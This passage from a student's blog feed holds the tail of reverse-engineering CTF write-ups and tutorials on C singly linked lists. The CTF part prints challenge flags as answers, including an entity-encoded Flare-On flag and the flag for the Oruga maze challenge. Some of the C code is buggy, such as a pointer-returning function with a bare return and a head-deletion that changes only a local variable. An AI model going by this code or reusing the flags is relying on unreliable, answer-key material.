href="mailto:&#x73;&#x68;&#x30;&#x30;&#116;&#105;&#x6e;&#x67;&#x5f;&#x70;&#104;&#105;&#x73;&#104;&#95;&#x69;&#110;&#x5f;&#97;&#95;&#x62;&#x61;&#114;&#114;&#101;&#108;&#64;&#102;&#x6c;&#x61;&#114;&#x65;&#45;&#111;&#x6e;&#x2e;&#99;&#x6f;&#109;">&#x73;&#x68;&#x30;&#x30;&#116;&#105;&#x6e;&#x67;&#x5f;&#x70;&#104;&#105;&#x73;&#104;&#95;&#x69;&#110;&#x5f;&#97;&#95;&#x62;&#x61;&#114;&#114;&#101;&#108;&#64;&#102;&#x6c;&#x61;&#114;&#x65;&#45;&#111;&#x6e;&#x2e;&#99;&#x6f;&#109;</a>}</p><p>后来看了题解按着题解的步骤，抄了下代码：</p><h1 id="ACTF新生赛2020-Oruga"><a href="#ACTF新生赛2020-Oruga" class="headerlink" title="[ACTF新生赛2020]Oruga"></a>[ACTF新生赛2020]Oruga</h1><p>首先找关键函数，发现是迷宫题：</p><p><img src="https://s2.loli.net/2022/01/16/ZElOLsWneyQi5NV.png" alt="屏幕截图 2022-01-09 133709"></p><p>于是开始找迷宫，发现以下汇编语言，找到迷宫：</p><p><img src="https://s2.loli.net/2022/01/16/wxWLcH1fiG7ETr8.png" alt="屏幕截图 2022-01-09 133724"></p><p>输出迷宫：</p><p><img src="https://s2.loli.net/2022/01/16/ICg3ByZi7LeOfmk.png" alt="屏幕截图 2022-01-09 134115"></p><p>手打得到flag:flag{MEWEMEWJMEWJM}</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>reverse</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>单链表的简单习题</title>
    <link href="/2022/01/20/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E7%AE%80%E5%8D%95%E4%B9%A0%E9%A2%98/"/>
    <url>/2022/01/20/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E7%AE%80%E5%8D%95%E4%B9%A0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="1-合并两个链表"><a href="#1-合并两个链表" class="headerlink" title="1.合并两个链表"></a>1.合并两个链表</h1><p>将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><p> <img src="https://s2.loli.net/2022/01/20/2bjHxR8dDm7frk1.png" alt="屏幕截图 2022-01-20 150104"></p><p>示例 1：</p><p>输入：l1 &#x3D; [1,2,4], l2 &#x3D; [1,3,4]<br>输出：[1,1,2,3,4,4]</p><blockquote><p>暴力法：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//首先要创建一个头节点和一个用来链接两个链表的节点,让两个链表一个一个比较然后链接起来</span><br><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">mergeTwoLists</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* list1, <span class="hljs-keyword">struct</span> ListNode* list2)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">HeadNode</span>=</span>(<span class="hljs-keyword">struct</span> ListNode* )<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ListNode));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pMove</span>=</span>HeadNode;<br>    <span class="hljs-keyword">while</span>(list1&amp;&amp;list2)&#123;<br>        <span class="hljs-keyword">if</span>(list1-&gt;val&lt;=list2-&gt;val)&#123;<br>            pMove-&gt;next=list1;<br>            list1=list1-&gt;next;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            pMove-&gt;next=list2;<br>            list2=list2-&gt;next;<br>        &#125;<br>        pMove=pMove-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(list1) pMove-&gt;next=list1;<br>    <span class="hljs-keyword">else</span> pMove-&gt;next=list2;<br>    <span class="hljs-keyword">return</span> HeadNode-&gt;next;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2-逆转链表"><a href="#2-逆转链表" class="headerlink" title="2.逆转链表"></a>2.逆转链表</h1><p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。</p><p><img src="https://s2.loli.net/2022/01/22/nmuptsqLGyOIi8z.jpg" alt="rev1ex1"></p><blockquote><p>输入：head &#x3D; [1,2]<br>输出：[2,1]</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">reverseList</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* head)</span>&#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pre</span>=</span><span class="hljs-literal">NULL</span>;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">cur</span>=</span>head;<br>      <span class="hljs-keyword">while</span>(cur)<br>      &#123;<br>          <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">next</span>=</span>cur-&gt;next;<span class="hljs-comment">//链表只会保存下一个节点，当逆转的时候原来的下一个节点就会消失，所以必须有一个结构体指针记录下一个节点</span><br>          cur-&gt;next=pre;<br>          pre=cur;<br>          cur=next;<br>      &#125;<br>      <span class="hljs-keyword">return</span> pre;<span class="hljs-comment">//逆转后原头节点变成了尾见点，原来的尾节点变成了头节点，因为pre一直记录的到cur尾NULL的时候，所以pre就是现在的尾节点。</span><br>&#125;<br></code></pre></td></tr></table></figure><p>以下是动图：<img src="https://s2.loli.net/2022/01/22/6xJIoQhElcHn78Z.gif" alt="cacea8121df8208784647d84e8a464cb17dfb8ef68a8f9f87fdae58f334b6746-file_1597038838572"></p><h1 id="3-删除链表中重复的节点"><a href="#3-删除链表中重复的节点" class="headerlink" title="3. 删除链表中重复的节点"></a>3. 删除链表中重复的节点</h1><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ocaml">在一个排序的链表中，存在重复的节点，请删除该链表中重复的节点，重复的节点不保留。<br><br>数据范围<br>链表中节点 <span class="hljs-keyword">val</span> 值取值范围 [<span class="hljs-number">0</span>,<span class="hljs-number">100</span>]。<br>链表长度 [<span class="hljs-number">0</span>,<span class="hljs-number">100</span>]。<br><br>样例<span class="hljs-number">1</span><br>输入：<span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span>-&gt;<span class="hljs-number">3</span>-&gt;<span class="hljs-number">3</span>-&gt;<span class="hljs-number">4</span>-&gt;<span class="hljs-number">4</span>-&gt;<span class="hljs-number">5</span><br><br>输出：<span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span>-&gt;<span class="hljs-number">5</span><br>样例<span class="hljs-number">2</span><br>输入：<span class="hljs-number">1</span>-&gt;<span class="hljs-number">1</span>-&gt;<span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span>-&gt;<span class="hljs-number">3</span><br><br>输出：<span class="hljs-number">2</span>-&gt;<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Note: The returned array must be malloced, assume caller calls free().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">deleteDuplication</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* head)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pHead</span>=</span>(<span class="hljs-keyword">struct</span> ListNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ListNode));<br>    pHead-&gt;next=head;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pre</span>=</span>pHead;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">cur</span>=</span>head;<br>    <span class="hljs-keyword">if</span>(!head) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">while</span>(cur)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(cur&amp;&amp;pre-&gt;next-&gt;val==cur-&gt;val) cur=cur-&gt;next;<br>        <span class="hljs-keyword">if</span>(pre-&gt;next-&gt;next==cur) pre=pre-&gt;next;<br>        <span class="hljs-keyword">else</span> pre-&gt;next=cur;<br>    &#125;<br>    <span class="hljs-keyword">return</span> pHead-&gt;next;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>warning:不能采用pre和cur都是首节点，然后开始判断的情况，因为会有这种特殊情况：从首节点开始到尾就是重复了</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>算法</tag>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表的初步学习--单链表</title>
    <link href="/2022/01/06/%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0--%E5%8D%95%E9%93%BE%E8%A1%A8/"/>
    <url>/2022/01/06/%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0--%E5%8D%95%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="链表的定义"><a href="#链表的定义" class="headerlink" title="链表的定义"></a>链表的定义</h1><p>链表是物理存储单元上<strong>非连续</strong>的、<strong>非顺序</strong>的存储结构，它是由一个个结点，通过指针来联系起来的，其中每个结点包括数据和指针。</p><p><img src="https://cdn.jsdelivr.net/gh/OOOOOORAN/PictureBed/img/202201061606450.png" alt="屏幕截图 2022-01-06 160632"></p><p>链表在内存中采用每个结点都分配在<strong>非连续</strong>的位置，结点与结点之间通过指针连在了一起，查找元素时需要遍历查找。</p><h1 id="链表的表示"><a href="#链表的表示" class="headerlink" title="链表的表示"></a>链表的表示</h1><h2 id="定义头节点："><a href="#定义头节点：" class="headerlink" title="定义头节点："></a>定义头节点：</h2><p>由于链表的特点（查询或删除元素都要从头结点开始）,所以我们只要在链表中定义头结点即可(我学习采用的是头节点无数据型的链表表示)：</p><p><img src="https://cdn.jsdelivr.net/gh/OOOOOORAN/PictureBed/img/202201061616514.png" alt="1577669607-4eeed00317fbd8a"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span><br>&#125;Node;<span class="hljs-comment">//定义结构体，并创建结构体指针用来链接节点</span><br>Node* <span class="hljs-title function_">createList</span><span class="hljs-params">()</span><br>&#123;<br>   Node* headNode;<br>   headNode=(Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>   headNode-&gt;next=<span class="hljs-literal">NULL</span>;<br>   <span class="hljs-keyword">return</span> headNode;<br>&#125;<span class="hljs-comment">//创建结构体指针需要向内存申请空间，通常来说头节点初始化不指向任何节点</span><br></code></pre></td></tr></table></figure><h2 id="创建节点："><a href="#创建节点：" class="headerlink" title="创建节点："></a>创建节点：</h2><p>创建完头节点后我们需要创建新的节点用来存储数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">createNode</span><span class="hljs-params">(<span class="hljs-type">int</span> data)</span><br>&#123;<br>    Node* newNode;<br>    newNode=(Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    newNode-&gt;data=data;<br>    newNode-&gt;next=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="连接节点："><a href="#连接节点：" class="headerlink" title="连接节点："></a>连接节点：</h2><p>链接节点可以采用两种方式：<strong>1. 头插法 2.尾插法</strong></p><h3 id="头插法："><a href="#头插法：" class="headerlink" title="头插法："></a>头插法：</h3><p><img src="https://cdn.jsdelivr.net/gh/OOOOOORAN/PictureBed/img/202201061618829.gif" alt="1577669607-2500a8c3aad50ab"></p><p><strong>具体步骤如上图所示，将将前一个节点指向插入的节点，将插入的节点指向原下一个节点</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">insertList</span><span class="hljs-params">(Node* headNode,<span class="hljs-type">int</span> data)</span><br>&#123;<br>    Node* newNode=createNode(data);<br>    newNode-&gt;next=headNode-&gt;next;<br>    headNode-&gt;next=newNode;<br>&#125;<span class="hljs-comment">//因为头插法需要头节点所以将头节点传入函数</span><br><span class="hljs-comment">//头插法最终输出时数据会逆向输出，因为前面的数据在链接后变到了最尾巴，输出时是顺序输出</span><br></code></pre></td></tr></table></figure><h3 id="尾插法（一）："><a href="#尾插法（一）：" class="headerlink" title="尾插法（一）："></a>尾插法（一）：</h3><p>观察头插法会发现，插入节点时永远会在头节点插入，导致数据是逆序的。那么只要数据都是在链表的最后插入就不会有这个问题。尾插法在头插法的基础上，设置了一个单独的结构体指针保证结构体在插入时永远是在尾巴插入，这样数据存储就是顺序的。</p><p><strong>这种尾插法有一个缺点，就是只能连续插入，不能分开插入，所以我们就有了第二种尾插法</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">LinkList</span><span class="hljs-params">()</span><br>&#123;<br>    Node* pMove;<br>    Node* headNode;<br>    headNode=pMove=(Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    pMove-&gt;next=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> data;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入您的数据：&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;data);<br>        <span class="hljs-keyword">if</span>(data==<span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;<br>        Node* newNode=createNode(data);<br>        pMove-&gt;next=newNode;<br>        pMove=newNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> headNode;<br>&#125;<span class="hljs-comment">//这里要创建headNode的原因是因为要先让headNode指向下一个节点不未NULL，要不然链表就断掉了。</span><br></code></pre></td></tr></table></figure><h3 id="尾插法（二）"><a href="#尾插法（二）" class="headerlink" title="尾插法（二）"></a>尾插法（二）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>   Node* headNode=createList();<span class="hljs-comment">//建立头节点</span><br>   Node* tail=headNode;<span class="hljs-comment">//建立一个指针用来插入节点</span><br>   <span class="hljs-comment">//下面为测试节点</span><br>   LinkList(&amp;tail,<span class="hljs-number">1</span>);<span class="hljs-comment">//结构体不包括地址，所以必须取地址符</span><br>   LinkList(&amp;tail,<span class="hljs-number">2</span>);<br>   LinkList(&amp;tail,<span class="hljs-number">3</span>);<br>   printList(headNode);<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>Node* <span class="hljs-title function_">LinkList</span><span class="hljs-params">(Node **ptail,<span class="hljs-type">int</span> data)</span><span class="hljs-comment">//实参引用结构题二级指针，来保证原函数tail能一直指向尾巴</span><br>&#123;<br>    Node* newNode=createNode(data);<br>    (*ptail)-&gt;next=newNode;<span class="hljs-comment">//这里要注意：*号的优先级比-&gt;低，所以必须用括号括起来</span><br>    (*ptail)=newNode;<br>    <span class="hljs-keyword">return</span> (*ptail);<span class="hljs-comment">//返回结构体指针</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="在任意位置插入节点"><a href="#在任意位置插入节点" class="headerlink" title="在任意位置插入节点"></a>在任意位置插入节点</h3><p>在任意处插入节点的重要点就在于要先找到要插入位置的地址，因为链表只能知道下一个节点，所以必须要遍历查找，并返回节点的地址，然后插入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">foundNode</span><span class="hljs-params">(Node* headNode,<span class="hljs-type">int</span> searchdata)</span><br>&#123;<br>    Node* pFound;<br>    <span class="hljs-type">int</span> isFound=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(pFound=headNode-&gt;next;pFound;pFound=pFound-&gt;next)<br>    &#123;<br>      <span class="hljs-keyword">if</span>(pFound-&gt;data==searchdata)&#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到了\n&quot;</span>);<br>          isFound=<span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">return</span> pFound;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!isFound) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;没找到\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insertNode</span><span class="hljs-params">(Node** pFound,<span class="hljs-type">int</span> data)</span><br>&#123;<br>   Node* newNode=createNode(data);<br>   newNode-&gt;next=(*pFound)-&gt;next;<br>   (*pFound)-&gt;next=newNode;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    Node* pFound;<br>    Node* headNode=createList();<br>    insertList(headNode,<span class="hljs-number">1</span>);<br>    insertList(headNode,<span class="hljs-number">2</span>);<br>    insertList(headNode,<span class="hljs-number">3</span>);<br>    insertList(headNode,<span class="hljs-number">4</span>);<br>    pFound=foundNode(headNode,<span class="hljs-number">2</span>);<br>    insertNode(&amp;pFound,<span class="hljs-number">6</span>);<br>    printList(headNode);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="打印链表"><a href="#打印链表" class="headerlink" title="打印链表"></a>打印链表</h3><p>链表只能循环打印</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">printList</span><span class="hljs-params">(Node* headNode)</span><br>&#123;<br>   Node* pMove=headNode-&gt;next;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打印链表\n&quot;</span>);<br>   <span class="hljs-keyword">while</span>(pMove)<br>   &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d-&gt;&quot;</span>,pMove-&gt;data);<br>      pMove=pMove-&gt;next;<br>   &#125;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="查找链表"><a href="#查找链表" class="headerlink" title="查找链表"></a>查找链表</h3><p>查找链表我暂时只学到遍历查找，等后续学到了会更新</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">searchNode</span><span class="hljs-params">(Node* headNode,<span class="hljs-type">int</span> searchdata)</span><br>&#123;<br>    <span class="hljs-type">int</span> isFound=<span class="hljs-number">0</span>;<br>    Node* pMove=headNode-&gt;next;<br>    <span class="hljs-keyword">while</span>(pMove)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(pMove-&gt;data==searchdata)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在此链表中找到了！\n&quot;</span>);<br>            isFound=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pMove=pMove-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!isFound) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;对不起没有找到！\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h3><p>一样的只会循环查找后删除，后续更新新的方法</p><p><strong>删除节点有几个要注意的地方：</strong></p><p><strong>一：首先要定义两个指针，因为删除节点需要该节点的前节点链接到该节点的下一个节点，而单链表只能知道下一个节点，所以必须要两个指针来删除</strong></p><p><strong>二：就是要注意，当删除的节点是头节点，那么就必须特殊对待，直接将headNode指向删掉节点的下一个节点</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(Node* headNode,<span class="hljs-type">int</span> deletenumber)</span><br>&#123;<br>    Node *q,*p;<br>    <span class="hljs-type">int</span> isFound=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(q=<span class="hljs-literal">NULL</span>,p=headNode-&gt;next;p;q=p,p=p-&gt;next)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(p-&gt;data==deletenumber)<span class="hljs-comment">//找到该节点</span><br>        &#123;<br>            isFound=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(!q)<span class="hljs-comment">//如果发现前节点是空，说明是头节点，那么只需要headNode指向p-&gt;next</span><br>                headNode=p-&gt;next;<br>            <span class="hljs-keyword">else</span><br>                q-&gt;next=p-&gt;next;<br>            <span class="hljs-built_in">free</span>(p);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!isFound) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未删除成功\n&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除成功\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>算法</tag>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>typora实现自动图片上传</title>
    <link href="/2022/01/03/typora%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/"/>
    <url>/2022/01/03/typora%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/</url>
    
